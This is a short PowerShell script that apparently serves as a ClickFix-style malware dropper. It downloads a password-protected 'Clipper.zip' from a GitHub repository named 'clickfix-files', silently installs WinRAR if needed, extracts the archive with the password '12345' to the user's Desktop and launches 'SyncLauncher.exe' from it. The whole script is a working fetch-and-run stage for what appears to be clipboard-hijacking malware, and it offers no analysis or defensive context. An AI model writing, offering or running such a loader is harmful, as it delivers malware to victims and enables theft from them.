$ErrorActionPreference = "Stop"

# Paths
$zipUrl = "https://github.com/0xL10NZ/clickfix-files/raw/refs/heads/main/Clipper.zip"
$downloadPath = "$env:USERPROFILE\Desktop\Clipper.zip"
$extractPath = "$env:USERPROFILE\Desktop\Clipper"
$exePath = "$extractPath\SyncLauncher.exe"

# Download Clipper.zip
Write-Host "Downloading Clipper.zip..."
Invoke-WebRequest -Uri $zipUrl -OutFile $downloadPath

# Check if WinRAR is installed
$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
if (-not (Test-Path $winrarPath)) {
    Write-Host "WinRAR not found. Installing WinRAR..."
    $winrarInstallerUrl = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
    $winrarInstallerPath = "$env:USERPROFILE\Desktop\winrar.exe"
    Invoke-WebRequest -Uri $winrarInstallerUrl -OutFile $winrarInstallerPath
    Start-Process -FilePath $winrarInstallerPath -ArgumentList "/S" -Wait
    Remove-Item $winrarInstallerPath
}

# Extract Clipper.zip
Write-Host "Extracting Clipper.zip..."
if (Test-Path $extractPath) {
    Remove-Item -Recurse -Force $extractPath
}
New-Item -ItemType Directory -Path $extractPath | Out-Null
Start-Process -FilePath $winrarPath -ArgumentList "x -p12345 $downloadPath * $extractPath\" -Wait

# Run SyncLauncher.exe
Write-Host "Running SyncLauncher.exe..."
Start-Process -FilePath $exePath

Write-Host "Done!"